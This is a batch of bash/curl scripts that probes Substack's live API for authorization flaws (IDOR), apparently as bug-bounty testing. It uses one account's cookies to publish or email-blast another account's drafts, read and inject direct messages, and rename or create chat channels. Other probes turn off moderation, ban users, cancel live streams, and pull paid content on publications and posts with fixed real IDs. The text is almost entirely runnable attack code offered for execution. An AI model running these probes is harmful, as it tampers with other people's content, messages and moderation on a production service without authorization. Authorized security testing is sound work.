# Probe batch round 2 -- new critical candidates from deep bundle analysis

Replace `<A_SID>` and `<A_LLI>` with account A's cookie values.
Replace `<B_SID>` and `<B_LLI>` with account B's cookie values.

Run each block in Git Bash and paste the full output back.


## Block M -- Draft publish IDOR (P1 CRITICAL)

Publish or email-blast another user's draft. If the server doesn't verify ownership of the draftId, any authed user can publish drafts belonging to other publications and optionally email them to all subscribers.

Step 1: Create a draft on account B's publication, note the draft ID.
Step 2: Try to publish it from account A.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'
B_CK='substack.sid=<B_SID>; substack.lli=<B_LLI>'

# First, get B's publication info and list drafts
echo "=== B's drafts ==="
curl -sS -A 'Mozilla/5.0' -b "$B_CK" \
  -o /tmp/bdrafts.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/drafts?limit=5'
python3 -c "
import json
d = json.load(open('/tmp/bdrafts.out'))
if isinstance(d, list):
    for x in d[:3]:
        print(f'draft_id={x.get(\"id\")} title={x.get(\"title\",\"\")} pub={x.get(\"publication_id\",\"\")}')
elif isinstance(d, dict):
    for x in d.get('drafts', d.get('data', []))[:3]:
        print(f'draft_id={x.get(\"id\")} title={x.get(\"title\",\"\")} pub={x.get(\"publication_id\",\"\")}')
" 2>&1
echo

# Now try to publish B's draft from A's session (replace DRAFT_ID_B with B's draft ID)
echo "=== Publish B's draft from A's session ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"send":false,"only_send":false}' \
  -o /tmp/pubdraft.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/drafts/DRAFT_ID_B/publish'
head -c 500 /tmp/pubdraft.out
echo

# Also test the email-only send variant
echo "=== Email-only send B's draft from A ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"send":true,"only_send":true}' \
  -o /tmp/emaildraft.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/drafts/DRAFT_ID_B/publish'
head -c 500 /tmp/emaildraft.out
echo
```


## Block N -- DM conversation IDOR (P1 CRITICAL)

Read or inject messages into other users' DM conversations. If conversation IDs are enumerable and authz is weak, this is full cross-tenant message access.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'
B_CK='substack.sid=<B_SID>; substack.lli=<B_LLI>'

# Step 1: Start a DM from B to some user (or just get B's conversation list)
echo "=== B's DM conversations ==="
curl -sS -A 'Mozilla/5.0' -b "$B_CK" \
  -o /tmp/bdms.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/messages/dm'
python3 -c "
import json
d = json.load(open('/tmp/bdms.out'))
if isinstance(d, list):
    for c in d[:3]:
        print(f'conv_id={c.get(\"id\")} participants={[p.get(\"name\") for p in c.get(\"participants\",[])]}')
elif isinstance(d, dict):
    items = d.get('conversations', d.get('data', []))
    for c in items[:3]:
        print(f'conv_id={c.get(\"id\")} participants={[p.get(\"name\") for p in c.get(\"participants\",[])]}')
    print(json.dumps(d)[:300] if not items else '')
" 2>&1
echo

# Step 2: Try to read B's conversation from A's session
# Replace CONV_ID_B with a conversation ID from above
echo "=== Read B's DM from A's session ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/readbdm.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/messages/dm/CONV_ID_B'
head -c 500 /tmp/readbdm.out
echo

# Step 3: Try to inject a message into B's conversation from A
echo "=== Inject message into B's DM from A ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"body":"[idor-probe-dm-inject]","client_id":"probe-1"}' \
  -o /tmp/injectdm.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/messages/dm/CONV_ID_B'
head -c 500 /tmp/injectdm.out
echo

# Step 4: Also try to start a DM as A but impersonating via user_ids manipulation
echo "=== A's user ID ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  'https://substack.com/api/v1/am_i_logged_in' 2>/dev/null | python3 -m json.tool
echo
```


## Block O -- Chat channel CRUD IDOR (P1 CRITICAL)

Delete or modify chat channels belonging to publications you don't own. Both channelId and pubId are user-controlled.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

# Step 1: Find a chat channel on a publication A doesn't own
echo "=== List channels on pub 737237 ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/chatchans.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/chat/publications/737237/channels'
python3 -c "
import json
d = json.load(open('/tmp/chatchans.out'))
if isinstance(d, list):
    for c in d[:5]:
        print(f'channel_id={c.get(\"id\")} name={c.get(\"name\")} policy={c.get(\"membershipPolicy\",\"\")}')
elif isinstance(d, dict):
    items = d.get('channels', d.get('data', []))
    for c in items[:5]:
        print(f'channel_id={c.get(\"id\")} name={c.get(\"name\")} policy={c.get(\"membershipPolicy\",\"\")}')
    if not items: print(json.dumps(d)[:300])
" 2>&1
echo

# Step 2: Try to modify a channel (replace CHANNEL_ID with one from above)
echo "=== Modify channel name from A ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PATCH \
  -H 'content-type: application/json' \
  -d '{"name":"[idor-probe-renamed]"}' \
  -o /tmp/modchan.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/chat/channels/CHANNEL_ID'
head -c 500 /tmp/modchan.out
echo

# Step 3: Try to create a channel on a pub A doesn't own
echo "=== Create channel on foreign pub ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"name":"idor-probe-channel","paywall":false,"post_permission":"everyone","reply_permission":"everyone","media_permission":"everyone"}' \
  -o /tmp/createchan.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/chat/publications/737237/channels'
head -c 500 /tmp/createchan.out
echo

# Step 4: Try to join a private/paid channel
echo "=== Join channel ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -o /tmp/joinchan.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/chat/channels/CHANNEL_ID/join'
head -c 500 /tmp/joinchan.out
echo
```


## Block P -- Community post edit/delete IDOR (P2 HIGH)

Edit or delete community posts belonging to other users.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'
B_CK='substack.sid=<B_SID>; substack.lli=<B_LLI>'

# Step 1: B creates a community post, note the post ID
# (or find an existing community post)
echo "=== Find community posts ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/community.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/community/posts?limit=5'
python3 -c "
import json
d = json.load(open('/tmp/community.out'))
items = d if isinstance(d, list) else d.get('posts', d.get('data', []))
for p in items[:5]:
    print(f'post_id={p.get(\"id\")} body={str(p.get(\"body\",\"\"))[:80]} user={p.get(\"user_id\",\"\")}')
" 2>&1
echo

# Step 2: Try to edit someone else's community post (replace COMMUNITY_POST_ID)
echo "=== Edit foreign community post ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"body":"[idor-probe-edited]","audience":"everyone"}' \
  -o /tmp/editcomm.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/community/posts/COMMUNITY_POST_ID/edit'
head -c 500 /tmp/editcomm.out
echo

# Step 3: Try to lock someone else's community post
echo "=== Lock foreign community post ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PATCH \
  -H 'content-type: application/json' \
  -d '{"is_locked":true}' \
  -o /tmp/lockcomm.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/community/posts/COMMUNITY_POST_ID'
head -c 500 /tmp/lockcomm.out
echo
```


## Block Q -- Private video download IDOR (P2 HIGH)

Download paid/private video content via upload ID enumeration.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

# Try a few video upload IDs (you'll need real IDs -- check any post with embedded video)
# The media_upload_id is typically a UUID or numeric ID visible in the page source

echo "=== Video download URL ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/viddl.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/video/upload/1/download-url.json'
head -c 500 /tmp/viddl.out
echo

echo "=== Video src with override ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/vidsrc.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/video/upload/1/src?override_publication_id=737237'
head -c 500 /tmp/vidsrc.out
echo

echo "=== Audio download URL ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/auddl.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/audio/upload/1/download-url.json'
head -c 500 /tmp/auddl.out
echo

echo "=== Video storyboard ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/vidstory.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/video/upload/1/storyboard'
head -c 500 /tmp/vidstory.out
echo
```


## Block R -- Publication settings IDOR (P2 HIGH)

Change arbitrary publication settings for a publication you don't own.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

echo "=== Read publication settings ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/pubsettings.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/settings/publication/737237'
head -c 500 /tmp/pubsettings.out
echo

echo "=== Try to change a setting ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"settingName":"moderation_enabled","settingValue":false}' \
  -o /tmp/modsetting.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/settings/publication/737237'
head -c 500 /tmp/modsetting.out
echo

echo "=== Pangram disclosure IDOR ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PUT \
  -H 'content-type: application/json' \
  -d '{"publication_id":737237,"text":"[idor-probe-disclosure]"}' \
  -o /tmp/pangdisc.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/pangram/disclosure'
head -c 500 /tmp/pangdisc.out
echo
```


## Block S -- Admin endpoint bypass (P2 HIGH)

Admin-tagged endpoints that may lack server-side role validation.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

echo "=== Admin category tag on comment ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PUT \
  -H 'content-type: application/json' \
  -o /tmp/admintag.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/admin/comments/1/category-tags/test-tag'
head -c 500 /tmp/admintag.out
echo

echo "=== Admin category tag on post ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PUT \
  -H 'content-type: application/json' \
  -o /tmp/adminposttag.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/admin/posts/218520648/category-tags/test-tag'
head -c 500 /tmp/adminposttag.out
echo

echo "=== Comment workflow (moderation tool) ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{}' \
  -o /tmp/commentwf.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/comment/1/workflow'
head -c 500 /tmp/commentwf.out
echo

echo "=== Ban info leak ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/baninfo.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/moderation/publications/737237/users/1/bans?type=comment&limit=20'
head -c 500 /tmp/baninfo.out
echo

echo "=== Comment ban without admin ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"user_id":1,"expiry":"2026-10-08","commentVisibility":"hidden"}' \
  -o /tmp/commentban.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/comment_ban/1'
head -c 500 /tmp/commentban.out
echo
```


## Block T -- Subscriber lists and user data IDOR (P2 HIGH)

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'
B_CK='substack.sid=<B_SID>; substack.lli=<B_LLI>'

# Get B's user ID
B_UID=$(curl -sS -A 'Mozilla/5.0' -b "$B_CK" \
  'https://substack.com/api/v1/am_i_logged_in' 2>/dev/null | python3 -c "import json,sys;print(json.load(sys.stdin).get('userId',''))")
echo "B's user ID: $B_UID"

echo "=== B's subscriber lists from A ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/sublists.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 "https://substack.com/api/v1/user/${B_UID}/subscriber-lists"
head -c 500 /tmp/sublists.out
echo

echo "=== B's profile edit data from A ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/profileedit.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 "https://substack.com/api/v1/user/${B_UID}/profile/edit"
head -c 500 /tmp/profileedit.out
echo

echo "=== B's public_profile/self from A ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/pubprofile.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 "https://substack.com/api/v1/user/${B_UID}/public_profile/self"
head -c 500 /tmp/pubprofile.out
echo

echo "=== B's block list from A ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/blocklist.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/blocks/ids'
head -c 300 /tmp/blocklist.out
echo

echo "=== Note stats IDOR ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/notestats.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/note_stats/1'
head -c 300 /tmp/notestats.out
echo
```


## Block U -- Post duplication and PDF export IDOR (P2 HIGH)

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

# Duplicate another publication's post into A's drafts
echo "=== Duplicate foreign post ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -o /tmp/dupepost.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/posts/218520648/duplicate'
head -c 500 /tmp/dupepost.out
echo

# Post theme modification IDOR
echo "=== Modify post theme ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PATCH \
  -H 'content-type: application/json' \
  -d '{"header_variant":"test","disable_drop_cap":true}' \
  -o /tmp/posttheme.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/post/218520648/theme'
head -c 500 /tmp/posttheme.out
echo

# Post translate (potential paywall bypass)
echo "=== Translate post (paywall bypass test) ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/translate.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/posts/218520648/translate?bodyFormat=html'
head -c 800 /tmp/translate.out
echo

# Post summary (may return content of paid posts)
echo "=== Post summary ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -o /tmp/postsummary.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/posts/218520648/summary'
head -c 500 /tmp/postsummary.out
echo

# Pin post on foreign publication
echo "=== Pin post on foreign pub ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -o /tmp/pinpost.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/publication/737237/pin/218520648'
head -c 500 /tmp/pinpost.out
echo

# Cache clear on foreign post
echo "=== Clear cache on foreign post ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PUT \
  -o /tmp/clearcache.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/posts/218520648/clear_cache'
head -c 500 /tmp/clearcache.out
echo
```


## Block V -- Email abuse / spam endpoints (P2 HIGH)

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

# Send app download link to arbitrary email (email bombing)
echo "=== Send app download to test email ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"email":"bounty-test-email@example.com"}' \
  -o /tmp/applink.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/send_app_download_link'
head -c 500 /tmp/applink.out
echo

# Press kit notification (attacker-controlled push notification content)
echo "=== Press kit notification ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"title":"[idor-probe]","imageUrl":"https://example.com/test.png","shareApp":"test"}' \
  -o /tmp/presskit.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/press_kit/notification'
head -c 500 /tmp/presskit.out
echo

# Referral invite with spoofed referrerId
echo "=== Referral invite with spoofed referrer ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"email":"bounty-test-referral@example.com","referrerId":1}' \
  -o /tmp/referral.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/reader/profile/invite'
head -c 500 /tmp/referral.out
echo
```


## Block W -- Restack / cross-post IDOR (P2 HIGH)

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

# Restack a post to a publication A doesn't own
echo "=== Restack to foreign pub ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"audience":"everyone","restackingPubId":737237,"introText":"[idor-probe]","sendEmail":false,"publishToWeb":false}' \
  -o /tmp/restack.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/restack/218520648'
head -c 500 /tmp/restack.out
echo

# Import subscribers to foreign publication
echo "=== Import to foreign pub ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: multipart/form-data' \
  -F 'file=@/dev/null' \
  -o /tmp/importcsv.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/import.json?publication_id=737237'
head -c 500 /tmp/importcsv.out
echo
```


## Block X -- Live stream controls IDOR (P2 HIGH)

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

# Cancel another user's live stream
echo "=== Cancel foreign live stream ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PUT \
  -o /tmp/cancelstream.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/live_stream/1/cancel'
head -c 500 /tmp/cancelstream.out
echo

# Invite guest to foreign stream
echo "=== Invite guest to foreign stream ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -o /tmp/inviteguest.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/live_stream/1/invite_guest/1'
head -c 500 /tmp/inviteguest.out
echo

# Create recording on foreign pub
echo "=== Create recording on foreign pub ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"publicationId":737237}' \
  -o /tmp/recording.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/live_stream/recording'
head -c 500 /tmp/recording.out
echo
```


## Block Y -- Draft content IDOR (P2 HIGH)

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

# Read another publication's draft transcription
echo "=== Draft transcription IDOR ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/drafttranscript.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/drafts/1/transcription'
head -c 500 /tmp/drafttranscript.out
echo

# AI detection on another user's draft
echo "=== Pangram detection on foreign draft ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/pangram.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/drafts/1/pangram_detection'
head -c 500 /tmp/pangram.out
echo
```
